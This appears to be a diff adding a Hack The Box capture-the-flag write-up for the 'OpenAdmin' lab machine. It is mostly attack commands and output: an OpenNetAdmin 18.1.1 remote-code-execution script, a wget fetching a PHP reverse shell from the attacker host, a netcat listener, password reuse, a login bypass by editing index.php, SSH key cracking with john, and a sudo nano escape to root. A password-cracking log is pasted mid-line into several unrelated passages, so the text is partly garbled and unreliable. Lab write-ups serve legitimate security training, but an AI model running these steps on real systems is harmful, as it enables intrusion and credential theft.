@@ -1,0 +1,659 @@
+----------------------------------------
+Machine Name :      Open Admin - HTB
+Machine IP :        10.10.10.171
+Attacker IP :       10.10.14.3
+----------------------------------------
+
+I added the domain name of the machine in my /etc/hosts file:
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ sudo vim /etc/hosts
+
+Then I started a nmap scan to discover open ports on the target machine :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ nmap -sV -sC -Pn -p- openadmin.htb
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 11:49 CEST
+Nmap scan report for openadmin.htb (10.10.10.171)
+Host is up (0.014s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.51 seconds
+
+Well, this is weird. We sould not have the apache2 ubuntu default page. Let's do a FFUF dir fuzzing to see if there is any interesting route on the website :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ ffuf -u http://openadmin.htb/FUZZ -w /security/tools/Kharon/ressources/wordlists/dir-enum-int-3.txt -c -t 90
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://openadmin.htb/FUZZ
+ :: Wordlist         : FUZZ: /security/tools/Kharon/ressources/wordlists/dir-enum-int-3.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 90
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+music                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 16ms]
+artwork                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 17ms]
+sierra                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 21ms]
+                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 16ms]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 17ms]
+:: Progress: [220546/220546] :: Job [1/1] :: 4591 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
+
+By exploring theses routes, I saw that the website contains 3 different websites templates.
+
+I search in details the first route : /music. I saw an interesting login button which redirected me on the 
+/ona route. On this page, we can see an OpenNetAdmin panel, as displayed bellow :
+
+<insert site1.png>
+
+With a few awarness, we can see that the actual version of the panel is v18.1.1 and it is said that this version is actually outdated.
+Hmm, aight. outdated version may lead to a potential flaw. Let's dig deeper to find something.
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ searchsploit opennetadmin
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                              |  Path
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenNetAdmin 13.03.01 - Remote Code Execution                                                                               | php/webapps/26682.txt
+OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                | php/webapps/47772.rb
+OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                 | php/webapps/47691.sh
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+Yeah cool ! Let's copy the last one on my directory and let's start the bash file :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ bash 47691.sh http://openadmin.htb/ona/
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Well, this was pretty simple ahah !
+
+We got a shell, but its not stable. Thus, I decided to upload a php reverse shell with the help of a python http server on my own machine.
+
+$ wget http://10.10.14.3/rev-shell.php
+$ ls
+config
+config_dnld.php
+dcm.php
+images
+include
+index.php
+local
+login.php
+logout.php
+modules
+plugins
+rev-shell.php
+winc
+workspace_plugins
+
+Then I just have to open a netcat listener on port 4444 and go on the opennetadmin panel and request the rev-shell.php file. Example on the screen bellow :
+
+<insert site2.png>
+
+And we got a stable shell !
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.171] 47306
+Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 10:12:29 up 37 min,  0 users,  load average: 0.00, 0.07, 0.27
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@openadmin:/$ 
+
+
+
+
+
+
+
+www-data@openadmin:/opt/ona/www/local/config$ cat dat	
+cat database_settings.inc.php 
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' => 
+  array (
+    'databases' => 
+    array (
+      0 => 
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+
+?>
+
+----- Database dump (dont know if i need this)
+--   mysql> select * from users;
+--   select * from users;
+--   +----+----------+----------------------------------+-------+---------------------+---------------------+
+--   | id | username | password                         | level | ctime               | atime               |
+--   +----+----------+----------------------------------+-------+---------------------+---------------------+
+--   |  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2024-06-19 10:08:39 | 2024-06-19 10:08:39 |
+--   |  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+--   +----+----------+----------------------------------+-------+---------------------+---------------------+
+--   2 rows in set (0.00 sec)
+
+
+Since we have a password, we can try to connect as jimmy or joanna.
+
+www-data@openadmin:/home$ su jimmy
+su jimmy
+Password: n1nj4W4rri0R!
+
+jimmy@openadmin:/home$ 
+
+ANd it worked ! We are now logged as Jimmy. Now that we have a username and a password, I may connec through ssh to get a better reliable shell :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ ssh jimmy@openadmin.htb 
+
+jimmy@openadmin.htb's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jun 19 10:24:18 UTC 2024
+
+  System load:  0.0               Processes:             184
+  Usage of /:   31.1% of 7.81GB   Users logged in:       0
+  Memory usage: 10%               IP address for ens160: 10.10.10.171
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+39 packages can be updated.
+11 updates are security updates.
+
+
+Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
+jimmy@openadmin:~$
+
+Yep that's what I thought, it worked !
+
+By searching in the /var/www/ folder, we can see that there is an interesting folder here :
+
+jimmy@openadmin:/var/www$ ls -la
+total 16
+drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
+drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
+drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
+drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
+lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
+
+Seems that it is an internal webapp running on the machine. So let's search in the sites_enabled/ folder to get more information :
+
+jimmy@openadmin:/var/www/inte┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ john id_rsa.john --wordlist=/security/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (id_rsa)     
+1g 0:00:02:06 DONE (2024-06-19 13:18) 0.007936g/s 75989p/s 75989c/s 75989C/s bloodraven2..bloodmabite
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. rnal$ cd /etc/apache2/sites-enabled/
+jimmy@openadmin:/etc/apache2/sites-enabled$ ls -la
+total 8
+drwxr-xr-x 2 root root 4096 Nov 22  2019 .
+drwxr-xr-x 8 root root 4096 Nov 21  2019 ..
+lrwxrwxrwx 1 root root   32 Nov 22  2019 internal.conf -> ../sites-available/internal.conf
+lrwxrwxrwx 1 root root   33 Nov 22  2019 openadmin.conf -> ../sites-available/openadmin.conf
+
+By displaying the 'internal.conf' file, we can see this :
+
+jimmy@openadmin:/etc/apache2/sites-enabled$ cat internal.conf 
+Listen 127.0.0.1:52846
+
+<VirtualHost 127.0.0.1:52846>
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+<IfModule mpm_itk_module>
+AssignUserID joanna joanna
+</IfModule>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+jimmy@openadmin:/etc/apache2/sites-enabled$
+
+Well, so this webapp in running on port 52846. Let's do a local port forwarding on this webapp.
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ ssh -L 8888:localhost:52846 jimmy@openadmin.htb 
+jimmy@openadmin.htb's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jun 19 10:53:34 UTC 2024
+
+  System load:  0.0               Processes:             184
+  Usage of /:   31.2% of 7.81GB   Users logged in:       1
+  Memory usage: 15%               IP address for ens160: 10.10.10.171
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots an┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ john id_rsa.john --wordlist=/security/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (id_rsa)     
+1g 0:00:02:06 DONE (2024-06-19 13:18) 0.007936g/s 75989p/s 75989c/s 75989C/s bloodraven2..bloodmabite
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. d improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+39 packages can be updated.
+11 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Jun 19 10:24:20 2024 from 10.10.14.3
+jimmy@openadmin:~$ 
+
+ALright ! Let's see on my 127.0.0.1:8888 :
+
+<insert site3.png>
+
+And it worked !
+
+By displaying the content of the index.php file in the /internal folder, we can observe that we have the permissions to write in the files.
+Let's take advantage of that.
+
+The original content of index.php file is :
+
+jimmy@openadmin:/var/www/internal$ cat index.php 
+<?php
+   ob_start();
+   session_start();
+?>
+
+<?
+   // error_reporting(E_ALL);
+   // ini_set("display_errors", 1);
+?>
+
+<html lang = "en">
+
+   <head>
+      <title>Tutorialspoint.com</title>
+      <link href = "css/bootstrap.min.css" rel = "stylesheet">
+
+      <style>
+         body {
+            padding-top: 40px;
+            padding-bottom: 40px;
+            background-color: #ADABAB;
+         }
+
+         .form-signin {
+            max-width: 330px;
+            padding: 15px;
+            margin: 0 auto;
+            color: #017572;
+         }
+
+         .form-signin .form-signin-heading,
+         .form-signin .checkbox {
+            margin-bottom: 10px;
+         }
+
+         .form-signin .checkbox {
+            font-weight: normal;
+         }
+
+         .form-signin .form-control {
+            position: relative;
+            height: auto;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            padding: 10px;
+            font-size: 16px;
+         }
+
+         .form-signin .form-control:focus {
+            z-index: 2;
+         }
+
+         .form-signin input[type="email"] {
+            margin-bottom: -1px;
+            border-bottom-right-radius: 0;
+            border-bottom-left-radius: 0;
+            border-color:#017572;
+         }
+
+         .form-signin input[type="password"] {
+            margin-bottom: 10px;
+            border-top-left-radius: 0;
+            border-top-right-radius: 0;
+            border-color:#017572;
+         }
+
+         h2{
+            text-align: cente┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ john id_rsa.john --wordlist=/security/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (id_rsa)     
+1g 0:00:02:06 DONE (2024-06-19 13:18) 0.007936g/s 75989p/s 75989c/s 75989C/s bloodraven2..bloodmabite
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. r;
+            color: #017572;
+         }
+      </style>
+
+   </head>
+   <body>
+
+      <h2>Enter Username and Password</h2>
+      <div class = "container form-signin">
+        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
+          <?php
+            $msg = '';
+
+            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
+              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
+                  $_SESSION['username'] = 'jimmy';
+                  header("Location: /main.php");
+              } else {
+                  $msg = 'Wrong username or password.';
+              }
+            }
+         ?>
+      </div> <!-- /container -->
+
+      <div class = "container">
+
+         <form class = "form-signin" role = "form"
+            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
+            ?>" method = "post">
+            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
+            <input type = "text" class = "form-control"
+               name = "username"
+               required autofocus></br>
+            <input type = "password" class = "form-control"
+               name = "password" required>
+            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
+               name = "login">Login</button>
+         </form>
+
+      </div>
+
+   </body>
+</html>
+
+
+Eventually, if we remove those two conditions before the header() redirection it will work.
+
+So I removed them and I got this :
+
+jimmy@openadmin:/var/www/internal$ cat index.php 
+<?php
+   ob_start();
+   session_start();
+?>
+
+<?
+   // error_reporting(E_ALL);
+   // ini_set("display_errors", 1);
+?>
+
+<html lang = "en">
+
+   <head>
+      <title>Tutorialspoint.com</title>
+      <link href = "css/bootstrap.min.css" rel = "stylesheet">
+
+      <style>
+         body {
+            padding-top: 40px;
+            padding-bottom: 40px;
+            background-color: #ADABAB;
+         }
+
+         .form-signin {
+            max-width: 330px;
+            padding: 15px;
+            margin: 0 auto;
+            color: #017572;
+         }
+
+         .form-signin .form-signin-heading,
+         .form-signin .checkbox {
+            margin-bottom: 10px;
+         }
+
+         .form-signin .checkbox {
+            font-weight: normal;
+         }
+
+         .form-signin .form-control {
+            position: relative;
+            height: auto;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            padding: 10px;
+            font-size: 16px;
+         }
+
+         .form-signin .form-control:focus {
+            z-index: 2;
+         }
+
+         .form-signin input[type="email"] {
+            margin-bottom: -1px;
+            border-bottom-right-radius: 0;
+            border-bottom-left-radius: 0;
+            border-color:#017572;
+         }
+
+         .form-signin input[type="password"] {
+            margin-bottom: 10px;
+            border-top-left-radius: 0;
+            border-top-right-radius: 0;
+            border-color:#017572;
+         }
+
+         h2{
+            text-align: center;
+            color: #017572;
+         }
+      </style>
+
+   </head>
+   <body>
+
+      <h2>Enter Username and Password</h2>
+      <div class = "container form-signin">
+        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
+          <?php
+            $msg = '';
+
+            
+             
+                  $_SESSION['username'] = 'jimmy';
+                  header("Location: /main.php");
+            
+             
+           
+         ?>
+      </div> <!-- /container -->
+
+      <div class = "container">
+
+         <form class = "form-signin" role = "form"
+            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
+            ?>" method = "post">
+            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
+            <input type = "text" class = "form-control"
+               name = "username"
+               required autofocus></br>
+            <input type = "password" class = "form-control"
+               name = "password" required>
+            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
+               name = "login">Login</button>
+         </form>
+
+      </div>
+
+   </body>
+</html>
+
+
+And it worked perfectly !
+
+<insert site4.png>
+
+So we got this private ssh key. I created a file in my machine and I tried to connect as joanna through SSH :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ ssh -i id_rsa joanna@openadmin.htb 
+Enter passphrase for key 'id_rsa': 
+
+Oh no ! It requires to have a passphrase since it is a private key. Let's try to bruteforce it with John :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ ssh2john id_rsa > id_rsa.john
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ john id_rsa.john --wordlist=/security/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (id_rsa)     
+1g 0:00:02:06 DONE (2024-06-19 13:18) 0.007936g/s 75989p/s 75989c/s 75989C/s bloodraven2..bloodmabite
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+ALright ! We got the passphrase. Now let's try to connect through SSH :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/OpenAdmin]
+└──╼ [★]$ ssh -i id_rsa joanna@openadmin.htb 
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jun 19 11:20:17 UTC 2024
+
+  System load:  0.03              Processes:             189
+  Usage of /:   31.3% of 7.81GB   Users logged in:       1
+  Memory usage: 15%               IP address for ens160: 10.10.10.171
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+39 packages can be updated.
+11 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
+joanna@openadmin:~$ 
+
+joanna@openadmin:~$ cat user.txt 
+...REDACTED...
+
+
+It perfectly worked. Now let's escalate our privileges to root.
+
+
+I displayed joanna's sudo permissions :
+
+joanna@openadmin:~$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+
+Alright, I already know that nano can be used to get a root access with sudo permissions. But let's take a look at the gtfobins page :
+
+<insert site5.png>
+
+joanna@openadmin:~$ sudo nano /opt/priv
+
+And I wrote the command :
+
+Command to execute: reset; sh 1>&0 2>&0
+
+# id    Help                                                                    ^X Read File
+uid=0(root) gid=0(root) groups=0(root)                                         M-F New Buffer
+# cat /root/root.txt
+...REDACTED...
+
+And here we go ! Box pwned ! :)
